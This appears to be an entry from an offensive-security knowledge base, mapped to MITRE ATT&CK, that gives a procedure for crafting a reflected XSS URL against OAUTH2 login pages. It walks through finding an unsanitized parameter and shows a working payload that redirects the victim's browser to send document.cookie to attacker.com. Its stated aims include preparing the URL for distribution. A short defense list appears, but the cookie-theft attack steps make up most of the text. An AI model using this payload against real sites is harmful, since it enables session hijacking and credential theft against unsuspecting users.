---
tags:
  - xss
  - reflected-xss
  - url-crafting
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/craft-xss-payload-url]]'
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[JavaScript]]'
id: 59356a52-4547-4876-9b0e-ce3fe82d6d3b
created_at: '2025-12-14T00:11:25.383Z'
updated_at: '2025-12-14T00:11:25.383Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft Malicious XSS URL

## Summary

This procedure involves crafting a malicious URL with an embedded XSS payload targeting reflected vulnerabilities in web applications, specifically in OAUTH2 login flows, to enable arbitrary JavaScript execution.

## Description

The procedure exploits improper input sanitization in URL parameters during the OAUTH2 login process. By injecting a JavaScript payload into a reflected parameter, attackers can force execution in the victim's browser, potentially leading to credential theft or session hijacking. This is common in web apps where user input is echoed back without proper escaping.

## Requirements

1. Knowledge of the vulnerable endpoint and parameter (e.g., OAUTH2 login URL)
2. Access to a text editor or scripting environment for URL construction
3. Understanding of JavaScript payloads for XSS

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding in web applications
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for suspicious URL patterns in logs

## Objectives

1. Create a functional malicious URL
2. Ensure payload reflects and executes
3. Prepare for distribution and exploitation

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Locate the URL parameter in the OAUTH2 flow that reflects input without sanitization.

Examine the login URL structure, such as https://app.com/oauth2/login?param=value.

> Test manually by appending simple payloads like <script>alert(1)</script>.

### Step 2: Craft and Encode Payload

**Context**: Build the XSS payload and append it to the URL.

**Command** ([[commands/craft-xss-payload-url]]):
```bash
echo 'https://vulnerable-app.com/oauth2/login?param=<script>document.location="http://attacker.com/steal?cookie="+document.cookie;</script>' > malicious_url.txt
```

> This command creates a URL that, when reflected, executes JS to exfiltrate cookies to an attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used

- [[commands/craft-xss-payload-url]]

## Tools Used

None

## Tags

- [[xss]]
- [[reflected-xss]]
